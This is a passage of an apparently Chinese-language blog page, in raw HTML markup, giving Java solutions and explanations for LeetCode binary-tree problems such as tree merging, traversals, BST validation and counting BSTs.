class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">mergeTrees</span><span class="hljs-params">(TreeNode t1, TreeNode t2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(t1 == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> t2;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(t2 == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> t1;<br>        &#125;<br>        TreeNode t = <span class="hljs-keyword">new</span> TreeNode(t1.val + t2.val);<br>        t.left = mergeTrees(t1.left,t2.left);<br>        t.right = mergeTrees(t1.right,t2.right);<br>        <span class="hljs-keyword">return</span> t;<br>    &#125;<br></code></pre></td></tr></table></figure><p>迭代法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">mergeTrees</span><span class="hljs-params">(TreeNode t1, TreeNode t2)</span> </span>&#123;<br><span class="hljs-comment">//如果 t1和t2中，只要有一个是null，函数就直接返回</span><br><span class="hljs-keyword">if</span>(t1==<span class="hljs-keyword">null</span> || t2==<span class="hljs-keyword">null</span>) &#123;<br><span class="hljs-keyword">return</span> t1==<span class="hljs-keyword">null</span>? t2 : t1;<br>&#125;<br>java.util.LinkedList&lt;TreeNode&gt; queue = <span class="hljs-keyword">new</span> java.util.LinkedList&lt;TreeNode&gt;();<br>queue.add(t1);<br>queue.add(t2);<br><span class="hljs-keyword">while</span>(queue.size()&gt;<span class="hljs-number">0</span>) &#123;<br>TreeNode r1 = queue.remove();<br>TreeNode r2 = queue.remove();<br>r1.val += r2.val;<br><span class="hljs-comment">//如果r1和r2的左子树都不为空，就放到队列中</span><br><span class="hljs-comment">//如果r1的左子树为空，就把r2的左子树挂到r1的左子树上</span><br><span class="hljs-keyword">if</span>(r1.left!=<span class="hljs-keyword">null</span> &amp;&amp; r2.left!=<span class="hljs-keyword">null</span>)&#123;<br>queue.add(r1.left);<br>queue.add(r2.left);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(r1.left==<span class="hljs-keyword">null</span>) &#123;<br>r1.left = r2.left;<br>&#125;<br><span class="hljs-comment">//对于右子树也是一样的</span><br><span class="hljs-keyword">if</span>(r1.right!=<span class="hljs-keyword">null</span> &amp;&amp; r2.right!=<span class="hljs-keyword">null</span>) &#123;<br>queue.add(r1.right);<br>queue.add(r2.right);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(r1.right==<span class="hljs-keyword">null</span>) &#123;<br>r1.right = r2.right;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> t1;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-6-二叉树的中序遍历"><a href="#5-6-二叉树的中序遍历" class="headerlink" title="5.6 二叉树的中序遍历"></a>5.6 二叉树的中序遍历</h2><p>递归法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Integer&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;Integer&gt;();<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> LinkedList&lt;Integer&gt;();<br>        &#125;<br>        recur(root);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">recur</span><span class="hljs-params">(TreeNode root)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        recur(root.left);<br>        res.add(root.val);<br>        recur(root.right);<br>    &#125;<br></code></pre></td></tr></table></figure><p>迭代法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-comment">//初始化</span><br>    List&lt;Integer&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>    Stack&lt;TreeNode&gt; stack = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>    TreeNode cur = root;<br><br>    <span class="hljs-comment">//遍历</span><br>    <span class="hljs-keyword">while</span>(cur != <span class="hljs-keyword">null</span> || !stack.isEmpty())&#123;<br>        <span class="hljs-keyword">while</span>(cur != <span class="hljs-keyword">null</span>)&#123;<br>            stack.push(cur);<br>            cur = cur.left;<br>        &#125;<br>        cur = stack.pop();<br>        res.add(cur.val);<br>        cur = cur.right;<br>    &#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考自leetcode颜色标记法：</p><p>兼具栈迭代方法的高效，又像递归方法一样简洁易懂，更重要的是，这种方法对于前序、中序、后序遍历，能够写出完全一致的代码。其核心思想如下：</p><ul><li>使用颜色标记节点的状态，新节点为白色，已访问的节点为灰色。</li><li>如果遇到的节点为白色，则将其标记为灰色，然后将其右子节点、自身、左子节点依次入栈。</li><li>如果遇到的节点为灰色，则将节点的值输出。</li></ul><p>使用这种方法实现的中序遍历如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ColorNode</span> </span>&#123;<br>        TreeNode node;<br>        String color;<br>        <br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ColorNode</span><span class="hljs-params">(TreeNode node,String color)</span></span>&#123;<br>            <span class="hljs-keyword">this</span>.node = node;<br>            <span class="hljs-keyword">this</span>.color = color;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;();<br>            <br>        List&lt;Integer&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        Stack&lt;ColorNode&gt; stack = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>        stack.push(<span class="hljs-keyword">new</span> ColorNode(root,<span class="hljs-string">&quot;white&quot;</span>));<br>        <br>        <span class="hljs-keyword">while</span>(!stack.empty())&#123;<br>            ColorNode cn = stack.pop();<br>            <br>            <span class="hljs-keyword">if</span>(cn.color.equals(<span class="hljs-string">&quot;white&quot;</span>))&#123;<br>                <span class="hljs-keyword">if</span>(cn.node.right != <span class="hljs-keyword">null</span>) stack.push(<span class="hljs-keyword">new</span> ColorNode(cn.node.right,<span class="hljs-string">&quot;white&quot;</span>));<br>                stack.push(<span class="hljs-keyword">new</span> ColorNode(cn.node,<span class="hljs-string">&quot;gray&quot;</span>));<br>                <span class="hljs-keyword">if</span>(cn.node.left != <span class="hljs-keyword">null</span>)stack.push(<span class="hljs-keyword">new</span> ColorNode(cn.node.left,<span class="hljs-string">&quot;white&quot;</span>));<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                res.add(cn.node.val);<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如要实现前序、后序遍历，只需要调整左右子节点的入栈顺序即可。</p><h2 id="5-7-二叉树的层序遍历"><a href="#5-7-二叉树的层序遍历" class="headerlink" title="5.7 二叉树的层序遍历"></a>5.7 二叉树的层序遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;<br>    Queue&lt;TreeNode&gt; queue = <span class="hljs-keyword">new</span> LinkedList&lt;TreeNode&gt;();<br>    List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>    <span class="hljs-keyword">if</span> (root != <span class="hljs-keyword">null</span>)&#123;<br>        queue.add(root);<br>    &#125;<br>    <span class="hljs-keyword">while</span>(!queue.isEmpty())&#123;<br>        List&lt;Integer&gt; list = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = queue.size();i &gt; <span class="hljs-number">0</span>;i--)&#123;<br>            TreeNode node = queue.poll();<br>            list.add(node.val);<br>            <span class="hljs-keyword">if</span> (node.left != <span class="hljs-keyword">null</span>)&#123;<br>                queue.add(node.left);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (node.right != <span class="hljs-keyword">null</span>)&#123;<br>                queue.add(node.right);<br>            &#125;<br>        &#125;<br>        res.add(list);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-8-重建二叉树"><a href="#5-8-重建二叉树" class="headerlink" title="5.8 重建二叉树"></a>5.8 重建二叉树</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">buildTree</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] preorder, <span class="hljs-keyword">int</span>[] inorder)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (preorder.length==<span class="hljs-number">0</span>||inorder.length==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-comment">//递归出口</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        TreeNode root = <span class="hljs-keyword">new</span> TreeNode(preorder[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; inorder.length;i++)&#123;<br>            <span class="hljs-keyword">if</span>(preorder[<span class="hljs-number">0</span>] == inorder[i])&#123;<br>                root.left = buildTree(Arrays.copyOfRange(preorder,<span class="hljs-number">1</span>,i+<span class="hljs-number">1</span>),Arrays.copyOfRange(inorder,<span class="hljs-number">0</span>,i));<br>                root.right = buildTree(Arrays.copyOfRange(preorder,i+<span class="hljs-number">1</span>,preorder.length),Arrays.copyOfRange(inorder,i+<span class="hljs-number">1</span>,inorder.length));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> root;<br><br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="5-9-二叉树展开为链表"><a href="#5-9-二叉树展开为链表" class="headerlink" title="5.9 二叉树展开为链表"></a>5.9 二叉树展开为链表</h2><p>可以使用O(n)的格外空间来接收先序遍历得到的节点，题目的进阶要求为使用O(1)的额外空间，也就是在原来的树上作出改动。</p><p>观察发现满足递归特性，将左子树展开结果连接到根节点的右子节点，再连接右子树展开结果。但是递归也会使用O(n)栈空间</p><p>已知的额外空间为O(1)的遍历方法为Mirros算法，下面借助Mirros算法思想：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">flatten</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        <span class="hljs-keyword">while</span> (root != <span class="hljs-keyword">null</span>) &#123; <br>            <span class="hljs-keyword">if</span>(root.left == <span class="hljs-keyword">null</span>)&#123;<br>                root = root.right;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                TreeNode pre = root.left;<br>                <span class="hljs-keyword">while</span>(pre.right != <span class="hljs-keyword">null</span>)&#123;<br>                    pre = pre.right;<br>                &#125;<br>                pre.right = root.right;<br>                root.right = root.left;<br>                root.left = <span class="hljs-keyword">null</span>;<br>                root = root.right;<br>            &#125;<br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="5-10-二叉树的最近公共祖先"><a href="#5-10-二叉树的最近公共祖先" class="headerlink" title="5.10 二叉树的最近公共祖先"></a>5.10 二叉树的最近公共祖先</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">lowestCommonAncestor</span><span class="hljs-params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span> || root == p || root == q) &#123;<br>            <span class="hljs-keyword">return</span> root;<br>        &#125;<br>        TreeNode left = lowestCommonAncestor(root.left,p,q);<br>        TreeNode right = lowestCommonAncestor(root.right,p,q);<br>        <span class="hljs-keyword">if</span>(left == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> right;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(right == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> left;<br>        &#125;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="5-11-二叉树中的最大路径和"><a href="#5-11-二叉树中的最大路径和" class="headerlink" title="5.11 二叉树中的最大路径和"></a>5.11 二叉树中的最大路径和</h2><p>后序递归遍历，首先计算节点贡献值，节点贡献值=节点值 + Math.max(左节点贡献值 +,右节点贡献值)，最大路径和=Max{每个节点的左右贡献值(&gt;0) + 节点值}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> maxSums = Integer.MIN_VALUE;<br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxPathSum</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>       maxGain(root);<br>       <span class="hljs-keyword">return</span> maxSums;<br>   &#125;<br>   <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxGain</span><span class="hljs-params">(TreeNode root)</span></span>&#123;<br>       <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>       &#125;<br>       <span class="hljs-keyword">int</span> leftNum = Math.max(maxGain(root.left),<span class="hljs-number">0</span>);<br>       <span class="hljs-keyword">int</span> rightNum = Math.max(maxGain(root.right),<span class="hljs-number">0</span>);<br>       <span class="hljs-keyword">int</span> grade = leftNum + rightNum + root.val;<br>       maxSums = Math.max(maxSums,grade);<br>       <span class="hljs-keyword">return</span> root.val + Math.max(leftNum,rightNum);<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="5-12-验证二叉搜索树"><a href="#5-12-验证二叉搜索树" class="headerlink" title="5.12 验证二叉搜索树"></a>5.12 验证二叉搜索树</h2><p>两个思路： </p><ul><li>可以通过验证二叉树的中序序列如果是递增序列说明是二叉搜索树。</li><li>验证每个节点左子树都小于根节点值，右子树都大于根节点值，但是找出左子树中的最小值或找出右子树最大值并不容易，可以扩展参数列表让左子树的值不得超过root.val，右子树的值不得小于root.val。</li></ul><p>思路1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">long</span> pre = Long.MIN_VALUE;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isValidBST</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!isValidBST(root.left))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(pre &gt;= root.val)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br>    pre = root.val;<br>    <span class="hljs-keyword">return</span> isValidBST(root.right);<br>&#125;<br></code></pre></td></tr></table></figure><p>思路2：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isValidBST</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> helper(root,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">helper</span><span class="hljs-params">(TreeNode root,Integer minSum,Integer maxSum)</span></span>&#123;<br>        <span class="hljs-comment">//递归出口</span><br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">int</span> val = root.val;<br>        <span class="hljs-comment">//前序遍历</span><br>        <span class="hljs-keyword">if</span>(minSum != <span class="hljs-keyword">null</span> &amp;&amp; val &lt;= minSum)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(maxSum != <span class="hljs-keyword">null</span> &amp;&amp; val &gt;= maxSum)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!helper(root.left,minSum,val))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!helper(root.right,val,maxSum))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-13-二叉搜索树转换为累加树"><a href="#5-13-二叉搜索树转换为累加树" class="headerlink" title="5.13 二叉搜索树转换为累加树"></a>5.13 二叉搜索树转换为累加树</h2><p>题目要求使每个节点 <code>node</code> 的新值等于原树中大于或等于 <code>node.val</code> 的值之和。相当于是二叉搜索树的中序逆序遍历，每次遍历到一个节点加上上一个节点就好。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">convertBST</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        inOrderTraverse(root);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>    <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">inOrderTraverse</span><span class="hljs-params">(TreeNode root)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        inOrderTraverse(root.right);<br>        root.val += sum;<br>        sum = root.val;<br>        inOrderTraverse(root.left);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="5-14-不同的二叉搜索树"><a href="#5-14-不同的二叉搜索树" class="headerlink" title="5.14 不同的二叉搜索树"></a>5.14 不同的二叉搜索树</h2><p>难点在于推出公式而不是动态规划</p><p>题目要求是计算不同二叉搜索树的个数。为此，我们可以定义两个函数：</p><ol><li>$G(n)$: 长度为 n 的序列能构成的不同二叉搜索树的个数。</li><li>$F(i, n)$: 以 i 为根、序列长度为 n 的不同二叉搜索树个数 $(1≤i≤n)$。</li></ol><p>有以下关系：</p><script type="math/tex; mode=display">G(n)= \sum_{n=1}^n F(i,n)\qquad \qquad(1)</script><p>举例而言，创建以 3 为根、长度为 7 的不同二叉搜索树，整个序列是 $[1, 2, 3, 4, 5, 6, 7]$，我们需要从左子序列 $[1,2]$ 构建左子树，从右子序列 $[4, 5, 6, 7]$ 构建右子树，然后将它们组合（即笛卡尔积）。</p><p>对于这个例子，不同二叉搜索树的个数为 $F(3, 7)$。我们将 $[1,2]$ 构建不同左子树的数量表示为G(2), 从$ [4, 5, 6, 7]$ 构建不同右子树的数量表示为 G(4)，注意到 G(n) 和序列的内容无关，只和序列的长度有关。于是，$F(3,7) = G(2) \cdot G(4)$。 因此，我们可以得到以下公式：</p><script type="math/tex; mode=display">F(i, n) = G(i-1) \cdot G(n-i) \qquad \qquad (2)</script><p>将公式 (1)，(2) 结合，可以得到 G(n) 的递归表达式：</p><script type="math/tex; mode=display">G(n) = \sum_{i=1}^{n}G(i-1) \cdot G(n-i) \qquad \qquad (3)</script><p>至此，我们从小到大计算 G 函数即可，因为G(n) 的值依赖于 $G(0) \cdots G(n-1)$。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">numTrees</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n + <span class="hljs-number">1</span>];<br>    res[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    res[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= i; j++)&#123;<br>            res[i] += res[j - <span class="hljs-number">1</span>] * res[i - j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res[n];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-15-打家劫舍-Ⅲ"><a href="#5-15-打家劫舍-Ⅲ" class="headerlink" title="5.15 打家劫舍 Ⅲ"></a>5.15 打家劫舍 Ⅲ</h2><p>树形dp，对于常见的动态规划遍历的状态是数组，可以采用自顶向下的递归遍历和自底向上的迭代遍历。而树形dp使用递归遍历比较方便。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs coq">    <span class="hljs-number">3</span><br>   / \<br>  <span class="hljs-number">2</span>   <span class="hljs-number">3</span><br>   \   \ <br>    <span class="hljs-number">3</span>   <span class="hljs-number">1</span><br>重叠的子问题在于选root下一步会递归root.<span class="hljs-built_in">left</span>.<span class="hljs-built_in">right</span><br>不选递归root.<span class="hljs-built_in">left</span>以后，root.<span class="hljs-built_in">left</span>不选又递归root.<span class="hljs-built_in">left</span>.<span class="hljs-built_in">right</span><br></code></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;TreeNode, Integer&gt; memo = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span 